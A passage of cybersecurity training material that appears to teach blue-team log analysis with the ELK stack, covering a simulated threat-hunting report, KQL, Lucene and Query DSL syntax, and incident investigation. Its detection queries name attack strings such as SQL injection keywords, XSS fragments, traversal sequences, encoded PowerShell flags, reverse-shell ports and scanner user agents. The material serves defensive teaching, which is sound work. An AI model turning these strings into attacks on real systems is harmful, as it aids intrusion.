+index=sysmon EventCode=13TargetObject="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*"
+Finding:
+The payload added itself to the Run key for persistence.
+3. Lateral Movement via RDP
+Windows Security Log – Event ID 4624:
+index=wineventlog EventCode=4624 LogonType=10| stats count by TargetUserName, SourceNetworkAddress, WorkstationName
+Finding:
+RDP sessions initiated from the infected host to multiple internal servers using cached credentials.
+4. Exfiltration Detection (Proxy Logs)
+Zscaler Format Sample:
+"timestamp","user","url","app_class","action","dstip""2024-06-22T12:45:02Z","jdoe","https://dl.dropboxusercontent.com/data.zip","Web-based file sharing","ALLOW","162.125.32.5"
+Query:
+SELECT * FROM proxy_logsWHERE url LIKE '%dropbox%' OR app_class='Web-based file sharing'
+Finding:
+Large volume of outbound HTTPS requests to Dropbox during non-working hours.
+5. Enrich With Threat Intelligence
+Lookup IOC:
+* The PowerShell C2 IP was found in ThreatFox and VirusTotal as linked to AsyncRAT campaigns.
+Phase 4 – Report Writing
+Report Template
+Title: Threat Hunting Report – Phishing to Exfiltration via Dropbox
+Date: 2025-06-30
+Author: [Your Name]
+Scope: Workstation COMP-011 / User jdoe
+Tools Used: Splunk, MISP, KQL, Sysmon, Proxy Logs, EDR Console
+Findings Summary
+Phase | Indicator/Event | Log Source | IOC Match
+Initial Access | powershell.exe -EncodedCommand ... | Sysmon | Yes
+Persistence | Run key HKCU\...\Run\UpdateWin.ps1 | Sysmon | No
+Lateral Movement | RDP from infected host to 3 internal servers | AD Logs | No
+Exfiltration | Dropbox upload during weekend | Zscaler Proxy | Yes
+MITRE ATT&CK Mapping
+* T1059.001 – PowerShell Execution
+* T1547.001 – Registry Run Key Persistence
+* T1021.001 – RDP Movement
+* T1041 – Exfiltration via Web Service
+Recommendations
+* Isolate host COMP-011 and reset credentials
+* Block outbound connections to dropboxusercontent.com
+* Deploy EDR remediation playbooks for all lateral targets
+* Strengthen email gateway to detect macro documents
+* Hunt for similar IOC patterns across the fleet
+Deliverables
+* .pdf Report
+* .ioc file with all extracted indicators
+* .csv of all log events matching threat behavior
+* Sigma rule for detection of this behavior chain
+Summary
+This simulation demonstrates how structured threat hunting using correlated logs, threat intel, and detection engineering can surface advanced threats that evade traditional alerting. Real-world Blue Teams should maintain playbooks, enrichments, and hunting dashboards to repeat this process quickly in live environments.
+Foundations of Log Analysis for Cyber Defense - 5.1 Introduction to SIEM and ELK Stack
+Lesson 01: Introduction to SIEM and ELK Stack
+What is SIEM?
+Security Information and Event Management (SIEM) is a security solution that provides real-time analysis of security alerts generated by applications and network hardware. SIEM systems combine two critical functions:
+* SIM (Security Information Management): Long-term storage, analysis, and reporting of log data
+* SEM (Security Event Management): Real-time monitoring, correlation, and notification of security events
+Core SIEM Capabilities
+Capability | Description
+Log Collection | Aggregate logs from multiple sources
+Normalization | Convert different log formats into a standard schema
+Correlation | Link related events across different sources
+Alerting | Notify analysts of suspicious activity
+Dashboards | Visualize security posture and trends
+Forensics | Search historical data for investigation
+Compliance | Generate reports for regulatory requirements
+The ELK Stack
+The ELK Stack is an open-source log management platform consisting of three core components:
+┌─────────────────────────────────────────────────────────────────┐│                         DATA SOURCES                            ││  [Firewalls] [Servers] [Applications] [Endpoints] [Cloud]       │└─────────────────────────┬───────────────────────────────────────┘                          │                          ▼┌─────────────────────────────────────────────────────────────────┐│                    BEATS (Data Shippers)                        ││  [Filebeat] [Winlogbeat] [Packetbeat] [Metricbeat] [Auditbeat]  │└─────────────────────────┬───────────────────────────────────────┘                          │                          ▼┌─────────────────────────────────────────────────────────────────┐│                      LOGSTASH                                   ││           [Input] → [Filter] → [Output]                         ││     Parse, Transform, Enrich, Normalize                         │└─────────────────────────┬───────────────────────────────────────┘                          │                          ▼┌─────────────────────────────────────────────────────────────────┐│                    ELASTICSEARCH                                ││           Indexing, Storage, Search Engine                      ││     [Index 1] [Index 2] [Index 3] ... [Index N]                 │└─────────────────────────┬───────────────────────────────────────┘                          │                          ▼┌─────────────────────────────────────────────────────────────────┐│                       KIBANA                                    ││    [Discover] [Dashboards] [Visualize] [Security] [Alerts]      ││              Visualization and Analysis                         │└─────────────────────────────────────────────────────────────────┘
+Elasticsearch
+Elasticsearch is the heart of the ELK Stack - a distributed search and analytics engine built on Apache Lucene.
+Key Concepts:
+Concept | Description | Example
+Index | Collection of documents with similar characteristics | firewall-logs-2024.01.15
+Document | Single unit of information (JSON format) | One log entry
+Field | Key-value pair in a document | source.ip: "192.168.1.100"
+Mapping | Schema definition for fields | timestamp as date type
+Shard | Horizontal subdivision of an index | Enables distributed storage
+Replica | Copy of a shard for redundancy | Fault tolerance
+Data Types in Elasticsearch:
+{  "mappings": {    "properties": {      "@timestamp": { "type": "date" },      "source.ip": { "type": "ip" },      "destination.port": { "type": "integer" },      "event.action": { "type": "keyword" },      "message": { "type": "text" },      "event.severity": { "type": "integer" },      "tags": { "type": "keyword" }    }  }}
+Logstash
+Logstash is a data processing pipeline that ingests, transforms, and sends data to Elasticsearch.
+Pipeline Structure:
+# Input: Where data comes frominput {  beats {    port => 5044  }  syslog {    port => 514    type => "syslog"  }}# Filter: How data is processedfilter {  if [type] == "syslog" {    grok {      match => { "message" => "%{SYSLOGTIMESTAMP:timestamp} %{HOSTNAME:host} %{PROG:program}: %{GREEDYDATA:message}" }    }    date {      match => [ "timestamp", "MMM  d HH:mm:ss", "MMM dd HH:mm:ss" ]    }  }  # GeoIP enrichment  geoip {    source => "source.ip"    target => "source.geo"  }  # DNS enrichment  dns {    reverse => [ "source.ip" ]    action => "replace"    hit_cache_size => 4096  }}# Output: Where data goesoutput {  elasticsearch {    hosts => ["https://elasticsearch:9200"]    index => "logs-%{+YYYY.MM.dd}"    user => "elastic"    password => "${ES_PASSWORD}"  }}
+Common Filter Plugins:
+Plugin | Purpose | Example Use
+grok | Parse unstructured text | Extract fields from syslog
+mutate | Modify fields | Rename, convert, remove fields
+date | Parse dates | Set @timestamp from log timestamp
+geoip | Add geographic data | Map IP to location
+dns | DNS lookups | Resolve IPs to hostnames
+translate | Value mapping | Map codes to descriptions
+aggregate | Combine events | Correlate related events
+Kibana
+Kibana is the visualization layer that provides a web interface for searching, viewing, and interacting with data stored in Elasticsearch.
+Key Features for Security:
+* Discover: Ad-hoc searching and filtering of log data
+* Dashboard: Create custom security dashboards
+* Visualize: Build charts, graphs, and maps
+* Elastic Security: Dedicated security analytics app
+* Alerting: Create detection rules and notifications
+* SIEM: Timeline, case management, and investigation tools
+Elastic Common Schema (ECS)
+ECS is a specification that defines a common set of fields for ingesting data into Elasticsearch. Using ECS ensures consistency across different data sources.
+Core ECS Field Sets
+@timestamp              # When the event occurredevent.category          # Category of the event (authentication, network, etc.)event.type              # Type within the category (start, end, info, etc.)event.outcome           # Success or failureevent.action            # Specific action takensource.ip               # Source IP addresssource.port             # Source portsource.user.name        # Source usernamedestination.ip          # Destination IP addressdestination.port        # Destination porthost.name               # Hostname where event occurredhost.ip                 # Host IP addressesuser.name               # Username associated with eventuser.id                 # User IDprocess.name            # Process nameprocess.pid             # Process IDprocess.command_line    # Full command linefile.path               # Full file pathfile.hash.sha256        # File hashnetwork.protocol        # Network protocolnetwork.direction       # Inbound or outbound
+ECS Example: Failed SSH Login
+{  "@timestamp": "2024-01-15T10:15:10.000Z",  "event": {    "category": ["authentication"],    "type": ["start"],    "outcome": "failure",    "action": "ssh_login"  },  "source": {    "ip": "10.0.0.6",    "port": 54321,    "geo": {      "country_name": "Unknown",      "city_name": "Unknown"    }  },  "destination": {    "ip": "192.168.1.10",    "port": 22  },  "user": {    "name": "admin",    "target": {      "name": "admin"    }  },  "host": {    "name": "webserver01",    "ip": ["192.168.1.10"]  },  "service": {    "name": "sshd",    "type": "ssh"  },  "message": "Failed password for admin from 10.0.0.6 port 54321 ssh2"}
+Data Sources for Security Monitoring
+Network Security
+Source | Data Type | Security Value
+Firewalls | Connection logs, denied traffic | Perimeter attacks, policy violations
+IDS/IPS | Alerts, signatures | Known attack patterns
+NetFlow/sFlow | Traffic metadata | Anomaly detection, lateral movement
+DNS Logs | Query/response | C2 communication, exfiltration
+Proxy Logs | Web traffic | Malicious downloads, phishing
+Endpoint Security
+Source | Data Type | Security Value
+Windows Event Logs | Security, System, Application | Authentication, process execution
+Sysmon | Process creation, network connections | Threat hunting, malware detection
+Linux Auditd | System calls, file access | Privilege escalation, persistence
+EDR Agents | Endpoint telemetry | Advanced threat detection
+Application Security
+Source | Data Type | Security Value
+Web Server Logs | Access, error logs | Web attacks (SQLi, XSS)
+Application Logs | Custom events | Business logic attacks
+Database Logs | Queries, access | Data exfiltration
+Authentication Logs | Login events | Credential attacks
+Cloud Security
+Source | Data Type | Security Value
+AWS CloudTrail | API calls | Unauthorized access
+Azure Activity Log | Resource operations | Configuration changes
+GCP Audit Logs | Admin activity | Privilege escalation
+Kubernetes Audit | API server events | Container security
+Lab Exercise: Understanding Log Flow
+Objective
+Trace a security event through the ELK pipeline to understand how data flows from source to visualization.
+Scenario
+A brute-force SSH attack is detected. Follow the data from the source system to Kibana.
+Step 1: Raw Log Entry (Source)
+Dec 30 10:15:10 webserver01 sshd[12345]: Failed password for admin from 10.0.0.6 port 54321 ssh2Dec 30 10:15:15 webserver01 sshd[12345]: Failed password for admin from 10.0.0.6 port 54322 ssh2Dec 30 10:15:20 webserver01 sshd[12345]: Failed password for admin from 10.0.0.6 port 54323 ssh2Dec 30 10:15:25 webserver01 sshd[12345]: Failed password for admin from 10.0.0.6 port 54324 ssh2Dec 30 10:15:27 webserver01 sshd[12345]: Disconnecting: Too many authentication failures
+Step 2: Filebeat Collection
+Filebeat reads the log file and adds metadata:
+{  "@timestamp": "2024-12-30T10:15:10.000Z",  "message": "Failed password for admin from 10.0.0.6 port 54321 ssh2",  "log": {    "file": {      "path": "/var/log/auth.log"    }  },  "host": {    "name": "webserver01"  },  "agent": {    "type": "filebeat",    "version": "8.11.0"  }}
+Step 3: Logstash Processing
+Logstash parses and enriches the event:
+{  "@timestamp": "2024-12-30T10:15:10.000Z",  "event": {    "category": ["authentication"],    "type": ["start"],    "outcome": "failure",    "action": "ssh_login"  },  "source": {    "ip": "10.0.0.6",    "port": 54321,    "geo": {      "country_iso_code": "CN",      "country_name": "China"    }  },  "user": {    "name": "admin"  },  "host": {    "name": "webserver01"  },  "service": {    "name": "sshd"  },  "tags": ["authentication", "ssh", "failed_login"]}
+Step 4: Elasticsearch Indexing
+Document stored in index security-events-2024.12.30 with full-text search capabilities.
+Step 5: Kibana Visualization
+* Discover: Search for event.outcome: failure AND service.name: sshd
+* Dashboard: View failed login trend over time
+* Alert: Trigger if > 5 failed logins from same IP in 5 minutes
+Key Takeaways
+* SIEM provides centralized visibility across all security-relevant data sources
+* ELK Stack is a powerful open-source SIEM platform with Elasticsearch for storage/search, Logstash for processing, and Kibana for visualization
+* ECS standardization ensures consistent field naming across different log sources
+* Data enrichment (GeoIP, DNS, threat intelligence) adds context for better analysis
+* Understanding the data pipeline helps troubleshoot issues and optimize performance
+Review Questions
+* What are the three main components of the ELK Stack and their roles?
+* Why is log normalization important in a SIEM environment?
+* What is ECS and why is it useful?
+* Name three types of data sources that should feed into a SIEM.
+* What is the difference between a shard and a replica in Elasticsearch?
+Next Lesson
+In Lesson 02, you will learn how to create powerful queries using KQL and Lucene syntax to search and filter security events in Elasticsearch.
+Foundations of Log Analysis for Cyber Defense - 5.2 Creating Queries in Elasticsearch and Kibana
+Lesson 02: Creating Queries in Elasticsearch and Kibana
+Overview
+Effective threat hunting and incident investigation require mastery of query languages. This lesson covers the two primary query languages used in the ELK Stack: Kibana Query Language (KQL) and Lucene Query Syntax.
+Kibana Query Language (KQL)
+KQL is the default query language in Kibana. It is designed to be simple and intuitive for searching log data.
+Basic Syntax
+field: valuefield: "exact phrase"field: value*           # Wildcardfield > value           # Comparison operatorsfield: value AND field2: value2field: value OR field2: value2NOT field: value
+Field Queries
+Exact Match:
+event.action: "login"user.name: "admin"source.ip: "192.168.1.100"destination.port: 22
+Wildcards:
+# Prefix matchuser.name: admin*# Suffix matchfile.name: *.exe# Containsmessage: *failed*# Single characteruser.name: admi?
+Comparison Operators:
+# Greater thandestination.port > 1024# Less thanevent.severity < 3# Greater than or equalhttp.response.status_code >= 400# Less than or equalevent.duration <= 5000# Range (inclusive)destination.port >= 20 AND destination.port <= 25
+Boolean Operators
+# AND - both conditions must matchevent.outcome: failure AND user.name: admin# OR - either condition matchessource.ip: 10.0.0.5 OR source.ip: 10.0.0.6# NOT - exclude matchesevent.action: login AND NOT event.outcome: success# Parentheses for grouping(event.action: login OR event.action: logout) AND user.name: admin
+Nested Field Queries
+For nested objects in documents:
+# Query nested fields with dot notationsource.geo.country_name: "China"process.parent.name: "cmd.exe"threat.indicator.ip: "203.0.113.50"
+Exists Queries
+Check if a field exists in the document:
+# Field existsuser.name: *# Field does not exist (use NOT)NOT user.name: *
+Lucene Query Syntax
+Lucene is the underlying query language for Elasticsearch. It offers more advanced features than KQL.
+Basic Syntax
+field:valuefield:"exact phrase"field:val*              # Wildcard prefixfield:*val              # Wildcard suffixfield:va?ue             # Single char wildcardfield:[min TO max]      # Range query+field:value            # Must match-field:value            # Must not match
+Range Queries
+# Inclusive range (includes boundaries)destination.port:[1 TO 1024]# Exclusive range (excludes boundaries)destination.port:{1 TO 1024}# Mixed rangedestination.port:[1 TO 1024}    # >= 1 AND < 1024# Open-ended rangesevent.severity:[3 TO *]         # >= 3@timestamp:[2024-01-01 TO *]    # From date onwardsdestination.port:[* TO 1024]    # <= 1024
+Fuzzy Searches
+Find similar terms (useful for typos or variations):
+# Default fuzziness (edit distance of 2)user.name:admni~# Specify edit distance (0, 1, or 2)user.name:admni~1# Similarity for phrasesmessage:"failed login"~3    # Words can be up to 3 positions apart
+Proximity Searches
+Find terms within a specified distance:
+# Words within 5 words of each othermessage:"password failed"~5# Useful for log messagesmessage:"authentication error"~10
+Boosting
+Increase the relevance score of certain terms:
+# Boost a term (default boost is 1)event.action:login^2 OR event.action:logout# Higher boost = more relevantsource.ip:10.0.0.6^5 OR source.ip:*
+Regular Expressions
+# Regex pattern (enclosed in forward slashes)user.name:/admin[0-9]+/# Match IP patternsource.ip:/192\.168\.1\.[0-9]+/# Match file extensionsfile.name:/.*\.(exe|dll|bat)/
+Boolean Operators in Lucene
+# AND (both must match)event.action:login AND event.outcome:failure# OR (either matches)source.ip:10.0.0.5 OR source.ip:10.0.0.6# NOT (exclude)event.action:login AND NOT user.name:admin# Required (+) and prohibited (-)+event.action:login -event.outcome:success# Grouping(event.action:login OR event.action:logout) AND user.name:admin
+Elasticsearch Query DSL
+For complex queries, especially in API calls or detection rules, use Elasticsearch Query DSL (JSON format).
+Match Query
+{  "query": {    "match": {      "message": "failed password"    }  }}
+Term Query (Exact Match)
+{  "query": {    "term": {      "event.outcome": "failure"    }  }}
+Bool Query (Complex Logic)
+{  "query": {    "bool": {      "must": [        { "term": { "event.action": "login" } },        { "term": { "event.outcome": "failure" } }      ],      "should": [        { "term": { "user.name": "admin" } },        { "term": { "user.name": "root" } }      ],      "must_not": [        { "term": { "source.ip": "192.168.1.1" } }      ],      "filter": [        { "range": { "@timestamp": { "gte": "now-1h" } } }      ],      "minimum_should_match": 1    }  }}
+Range Query
+{  "query": {    "range": {      "@timestamp": {        "gte": "2024-01-15T00:00:00",        "lte": "2024-01-15T23:59:59",        "format": "strict_date_optional_time"      }    }  }}
+Wildcard Query
+{  "query": {    "wildcard": {      "user.name": {        "value": "admin*"      }    }  }}
+Aggregations
+Count events by field values:
+{  "size": 0,  "aggs": {    "top_source_ips": {      "terms": {        "field": "source.ip",        "size": 10      }    },    "events_over_time": {      "date_histogram": {        "field": "@timestamp",        "calendar_interval": "hour"      }    }  }}
+Security-Focused Query Examples
+Authentication Attacks
+Failed Logins:
+event.category: authentication AND event.outcome: failure
+Brute Force Detection (multiple failures from same IP):
+event.category: authentication AND event.outcome: failure AND source.ip: 10.0.0.6
+Successful Login After Multiple Failures:
+event.category: authentication AND event.outcome: success AND source.ip: 10.0.0.6
+Login Outside Business Hours:
+event.action: login AND event.outcome: success
+(Then filter by time in Kibana: before 8:00 or after 18:00)
+Login from Unusual Location:
+event.category: authentication AND NOT source.geo.country_iso_code: US
+Network Attacks
+Port Scanning Detection:
+event.category: network AND event.action: denied AND destination.port < 1024
+SSH Brute Force:
+destination.port: 22 AND event.outcome: failure
+Suspicious Outbound Connections:
+network.direction: outbound AND destination.port: (4444 OR 5555 OR 6666 OR 1337)
+DNS Tunneling Indicators:
+dns.question.type: TXT AND dns.question.name: *.*.*.*.*
+Large Data Transfer:
+network.bytes > 100000000
+Web Application Attacks
+SQL Injection Attempts:
+url.query: (*SELECT* OR *UNION* OR *INSERT* OR *DROP* OR *UPDATE* OR *DELETE*)
+XSS Attempts:
+url.query: (*<script>* OR *javascript:* OR *onerror=*)
+Directory Traversal:
+url.path: (*../* OR *..../* OR *%2e%2e%2f*)
+Web Shell Detection:
+url.path: (*.php* OR *.asp* OR *.jsp*) AND http.request.method: POST AND http.response.status_code: 200
+404 Scanning:
+http.response.status_code: 404 AND source.ip: 10.0.0.6
+Endpoint Attacks
+Suspicious Process Execution:
+process.name: (powershell.exe OR cmd.exe OR wscript.exe OR cscript.exe) AND process.command_line: (*-enc* OR *-encoded* OR *hidden* OR *bypass*)
+Privilege Escalation:
+event.action: "added-member-to-group" AND group.name: (Administrators OR "Domain Admins")
+Suspicious File Creation:
+event.category: file AND event.action: creation AND file.extension: (exe OR dll OR bat OR ps1) AND file.path: (*\\Temp\\* OR *\\AppData\\*)
+Registry Persistence:
+registry.path: (*\\Run\\* OR *\\RunOnce\\* OR *\\Services\\*)
+Cloud Security
+AWS Unauthorized Access:
+cloud.provider: aws AND event.action: ConsoleLogin AND event.outcome: failure
+Azure Suspicious Activity:
+cloud.provider: azure AND event.action: "Add member to role" AND azure.activitylogs.properties.targetResources.role: "Owner"
+S3 Bucket Made Public:
+cloud.provider: aws AND event.action: PutBucketPolicy AND aws.cloudtrail.request_parameters: *public*
+Query Optimization Tips
+1. Use Specific Fields
+Slow:
+*failed*
+Fast:
+event.outcome: failure
+2. Avoid Leading Wildcards
+Slow:
+message: *password*
+Fast:
+message: password*
+3. Use Keyword Fields for Exact Matches
+# For exact match, use .keyword suffixuser.name.keyword: "admin"
+4. Limit Time Range
+Always specify a time range to reduce the data scanned:
+# In Kibana, set time picker to relevant period# In Query DSL, use range filter on @timestamp
+5. Use Filters Instead of Queries
+Filters are cached and faster for repeated searches:
+{  "query": {    "bool": {      "filter": [        { "term": { "event.category": "authentication" } },        { "term": { "event.outcome": "failure" } }      ]    }  }}
+Lab Exercise: Building Security Queries
+Scenario
+Using the sample logs, create queries to investigate the following scenarios.
+Exercise 1: Find All Failed Authentication Events
+KQL:
+event.outcome: failure AND event.category: authentication
+Expected Result: All failed login attempts from auth.log
+Exercise 2: Identify Brute Force Attack Source
+KQL:
+event.outcome: failure AND user.name: admin AND source.ip: *
+Aggregation Query (DSL):
+{  "size": 0,  "query": {    "bool": {      "must": [        { "term": { "event.outcome": "failure" } },        { "term": { "user.name": "admin" } }      ]    }  },  "aggs": {    "attacking_ips": {      "terms": {        "field": "source.ip",        "size": 10      }    }  }}
+Exercise 3: Web Application Attack Detection
+KQL (SQL Injection):
+http.request.method: GET AND url.query: (*select* OR *union* OR *1=1*)
+KQL (Admin Page Scanning):
+http.response.status_code: 404 AND url.path: (*admin* OR *wp-login* OR *phpmyadmin*)
+Exercise 4: Firewall Blocked Traffic Analysis
+KQL:
+event.action: (blocked OR denied OR reject) AND source.ip: 10.0.0.*
+Exercise 5: Correlate Authentication and Firewall Events
+Step 1 - Find blocked SSH:
+destination.port: 22 AND event.action: blocked
+Step 2 - Check auth logs for same IP:
+service.name: sshd AND source.ip: <IP from step 1>
+Quick Reference Card
+KQL Operators
+Operator | Example | Description
+: | field: value | Field equals value
+> | port > 1024 | Greater than
+>= | port >= 1024 | Greater than or equal
+< | port < 1024 | Less than
+<= | port <= 1024 | Less than or equal
+* | user: admin* | Wildcard
+AND | a AND b | Both must match
+OR | a OR b | Either matches
+NOT | NOT a | Must not match
+() | (a OR b) AND c | Grouping
+Lucene Operators
+Operator | Example | Description
+~ | word~ | Fuzzy search
+~N | "word1 word2"~5 | Proximity search
+^ | term^2 | Boost relevance
+[] | [1 TO 10] | Inclusive range
+{} | {1 TO 10} | Exclusive range
+// | /regex/ | Regular expression
++ | +required | Must match
+- | -excluded | Must not match
+Key Takeaways
+* KQL is simpler and recommended for most Kibana searches
+* Lucene offers advanced features like fuzzy search, proximity, and regex
+* Query DSL provides full control for complex queries and aggregations
+* Optimize queries by using specific fields, avoiding leading wildcards, and limiting time ranges
+* Build a library of security queries for common attack patterns
+Review Questions
+* What is the difference between KQL and Lucene query syntax?
+* How would you search for all failed SSH logins in the last 24 hours?
+* Write a query to find potential SQL injection attempts.
+* What is the advantage of using filters over queries in Elasticsearch?
+* How do you perform a fuzzy search in Lucene?
+Next Lesson
+In Lesson 03, you will learn how to investigate security incidents using ELK, including timeline analysis, event correlation, and building investigation workflows.
+Foundations of Log Analysis for Cyber Defense - 5.3 Investigating Security Incidents with ELK
+Lesson 03: Investigating Security Incidents with ELK
+Overview
+This lesson covers the methodology for investigating security incidents using the ELK Stack. You will learn how to correlate events across multiple data sources, build investigation timelines, and document findings.
+Incident Investigation Methodology
+The Investigation Workflow
+┌────────────────────────────────────────────────────────────────────────┐│                    INCIDENT INVESTIGATION WORKFLOW                     │└────────────────────────────────────────────────────────────────────────┘     ┌─────────┐     ┌──────────┐     ┌─────────┐     ┌──────────────┐     │ DETECT  │────>│ TRIAGE   │────>│ ANALYZE │────>│ CONTAIN      │     └─────────┘     └──────────┘     └─────────┘     └──────────────┘          │               │               │                  │          ▼               ▼               ▼                  ▼     ┌─────────┐     ┌──────────┐     ┌─────────┐     ┌──────────────┐     │ Alert   │     │ Validate │     │ Pivot   │     │ Isolate      │     │ Trigger │     │ Severity │     │ Expand  │     │ Block        │     │         │     │ Scope    │     │ Correlate│    │ Remediate    │     └─────────┘     └──────────┘     └─────────┘     └──────────────┘                                           │                                           ▼                                    ┌─────────────┐                                    │  DOCUMENT   │                                    │  Timeline   │                                    │  IOCs       │                                    │  Report     │                                    └─────────────┘
+Key Investigation Questions
+Phase | Questions to Answer
+What | What type of attack? What systems affected? What data accessed?
+When | When did it start? When was it detected? Timeline of events?
+Where | Which hosts? Which network segments? Internal or external?
+Who | Which user accounts? Threat actor attribution?
+How | Attack vector? Techniques used? Vulnerabilities exploited?
+Why | Motivation? Target of value?
+Pivoting Techniques
+Pivoting is the process of using one piece of evidence to find related events and expand the investigation scope.
+Pivot Points
+┌─────────────┐                         │   IP ADDRESS│                         └──────┬──────┘                                │        ┌───────────────────────┼───────────────────────┐        ▼                       ▼                       ▼┌───────────────┐       ┌───────────────┐       ┌───────────────┐│ Other Sessions│       │  DNS Queries  │       │ Firewall Logs ││ from same IP  │       │ to/from IP    │       │ involving IP  │└───────────────┘       └───────────────┘       └───────────────┘        │                       │                       │        ▼                       ▼                       ▼┌───────────────┐       ┌───────────────┐       ┌───────────────┐│ User Accounts │       │   Domains     │       │ Other Ports/  ││ from Sessions │       │   Resolved    │       │ Protocols     │└───────────────┘       └───────────────┘       └───────────────┘
+Common Pivot Fields
+Start With | Pivot To | Query Example
+IP Address | All events from IP | source.ip: "10.0.0.6"
+IP Address | DNS lookups | dns.resolved_ip: "10.0.0.6"
+IP Address | Other hosts contacted | destination.ip: "10.0.0.6"
+Username | All user activity | user.name: "admin"
+Username | Other IPs used | user.name: "admin" AND source.ip: *
+Hostname | All host events | host.name: "webserver01"
+Process | Parent/child processes | process.parent.name: "cmd.exe"
+File Hash | Other hosts with file | file.hash.sha256: "abc123..."
+Domain | Related IPs/requests | dns.question.name: "malware.com"
+Session ID | Full session activity | session.id: "xyz789"
+Timeline Analysis
+Building a timeline is essential for understanding the sequence of events during an incident.
+Timeline Construction in Kibana
+Step 1: Identify the Time Window
+Start with the alert timestamp and expand outward:
+# Initial alert at 10:15:10# Search 30 minutes before and after@timestamp >= "2024-12-30T09:45:00" AND @timestamp <= "2024-12-30T10:45:00"
+Step 2: Filter by Relevant Entities
+source.ip: "10.0.0.6" OR destination.ip: "10.0.0.6" OR user.name: "admin"
+Step 3: Sort by Timestamp
+In Kibana Discover, sort by @timestamp ascending to see events in chronological order.
+Step 4: Build the Narrative
+Document each significant event in sequence.
+Timeline Example: Brute Force Attack
+Time | Source | Event | Details
+10:08:00 | access.log | Web Scan | 10.0.0.6 scans /wp-login.php (404)
+10:08:01 | access.log | Web Scan | 10.0.0.6 scans /admin (404)
+10:08:02 | access.log | Web Scan | 10.0.0.6 scans /administrator (404)
+10:08:00 | firewall.log | Blocked | Telnet (port 23) from 10.0.0.6 rejected
+10:15:10 | auth.log | SSH Fail | Failed password for admin from 10.0.0.6
+10:15:15 | auth.log | SSH Fail | Failed password for admin from 10.0.0.6
+10:15:20 | firewall.log | Blocked | SSH (port 22) from 10.0.0.6 rejected
+10:15:20 | auth.log | SSH Fail | Failed password for admin from 10.0.0.6
+10:15:25 | auth.log | SSH Fail | Failed password for admin from 10.0.0.6
+10:15:27 | auth.log | Disconnect | Too many authentication failures
+Timeline Visualization
+Create a Kibana visualization to display events over time:
+* Go to Visualize > Create visualization > Area or Bar
+* Set X-axis to @timestamp with appropriate interval
+* Set Y-axis to count
+* Split by event.action or event.category
+* Apply filters for your investigation scope
+Event Correlation
+Correlation Rules
+Correlation connects related events across different data sources to reveal the full attack story.
+Example: Correlating Web Access with Authentication
+┌─────────────────────────────────────────────────────────────────┐│                   CORRELATION EXAMPLE                           │└─────────────────────────────────────────────────────────────────┘    access.log                    auth.log                firewall.log    ──────────                    ────────                ────────────    10:01:15                      10:01:15                10:01:10    POST /login    ─────────────> sshd: Success ────────> ALLOW 443    192.168.1.4                   admin@192.168.1.4       192.168.1.4         │                              │         │     SAME IP + TIME           │         └──────────────────────────────┘                      │                      ▼            ┌─────────────────────┐            │ CORRELATED EVENT:   │            │ Successful login    │            │ from 192.168.1.4    │            │ at 10:01:15         │            └─────────────────────┘
+Multi-Source Correlation Query
+# Find all activity from attacker IP across all log typessource.ip: "10.0.0.6"
+Then analyze results grouped by:
+* event.category (authentication, network, web, etc.)
+* event.action (login, blocked, GET, POST, etc.)
+* event.outcome (success, failure)
+Correlation Using Elasticsearch Aggregations
+{  "size": 0,  "query": {    "bool": {      "must": [        { "term": { "source.ip": "10.0.0.6" } }      ],      "filter": [        { "range": { "@timestamp": { "gte": "now-1d" } } }      ]    }  },  "aggs": {    "events_by_category": {      "terms": { "field": "event.category" },      "aggs": {        "events_by_action": {          "terms": { "field": "event.action" }        }      }    },    "timeline": {      "date_histogram": {        "field": "@timestamp",        "calendar_interval": "minute"      }    }  }}
+Indicators of Compromise (IOCs)
+Extracting IOCs
+During investigation, extract and document IOCs for:
+* Blocking in security controls
+* Hunting for related activity
+* Sharing with threat intelligence platforms
+IOC Type | Example | Query to Extract
+IP Address | 10.0.0.6 | source.ip: * AND event.outcome: failure
+Domain | malware.evil.com | dns.question.name: *
+File Hash | a1b2c3d4... | file.hash.sha256: *
+URL | /admin/shell.php | url.path: *
+User Agent | SQLMap/1.0 | user_agent.original: *
+Email | phisher@evil.com | email.from.address: *
+IOC Query for Investigation
+# Search for known malicious IPsource.ip: "10.0.0.6" OR destination.ip: "10.0.0.6"# Search for suspicious domainsdns.question.name: (*.xyz OR *.top OR *.tk OR *.ml)# Search for malicious file hashesfile.hash.sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"# Search for exploit user agentsuser_agent.original: (*sqlmap* OR *nikto* OR *nmap* OR *masscan*)
+Investigation Scenarios
+Scenario 1: Brute Force SSH Attack
+Initial Alert:
+Multiple failed SSH login attempts detected from IP 10.0.0.6
+Investigation Steps:
+Step 1: Scope the Attack
+source.ip: "10.0.0.6" AND destination.port: 22
+Step 2: Identify Target Accounts
+source.ip: "10.0.0.6" AND event.category: authentication
+Step 3: Check for Success
+source.ip: "10.0.0.6" AND event.outcome: success
+Step 4: Look for Lateral Activity
+source.ip: "10.0.0.6" AND NOT destination.port: 22
+Step 5: Check Firewall Response
+source.ip: "10.0.0.6" AND event.action: (blocked OR denied OR reject)
+Findings Documentation:
+## Incident: Brute Force SSH Attack**Date:** 2024-12-30**Attacker IP:** 10.0.0.6**Target:** admin account on webserver01### Timeline:- 10:08:00 - Web reconnaissance (admin page scanning)- 10:08:00 - Telnet attempt blocked by firewall- 10:15:10 - SSH brute force begins- 10:15:20 - Firewall blocks SSH from attacker- 10:15:27 - System disconnects attacker### IOCs:- IP: 10.0.0.6- Target: SSH (port 22)- Username: admin### Outcome:Attack unsuccessful. Firewall blocked attacker after multiple failures.### Recommendations:1. Block 10.0.0.6 at perimeter firewall2. Implement fail2ban for SSH3. Enable MFA for admin accounts
+Scenario 2: Web Application Attack
+Initial Alert:
+SQL injection attempt detected on web server
+Investigation Steps:
+Step 1: Find the Attack Requests
+url.query: (*UNION* OR *SELECT* OR *1=1* OR *OR 1=1*) AND http.response.status_code: *
+Step 2: Check Response Codes
+source.ip: "<attacker_ip>" AND http.response.status_code: (200 OR 500)
+* 200 with data = successful injection
+* 500 = server error (partial success)
+* 403/400 = blocked by WAF
+Step 3: Identify Attack Surface
+source.ip: "<attacker_ip>" AND http.request.method: (GET OR POST)
+Step 4: Check for Data Exfiltration
+source.ip: "<attacker_ip>" AND http.response.body.bytes > 10000
+Step 5: Review Application Errors
+log.level: ERROR AND @timestamp >= "<attack_start_time>"
+Scenario 3: Unauthorized Access Attempt
+Initial Alert:
+Access denied to /admin/dashboard from external IP
+Investigation Steps:
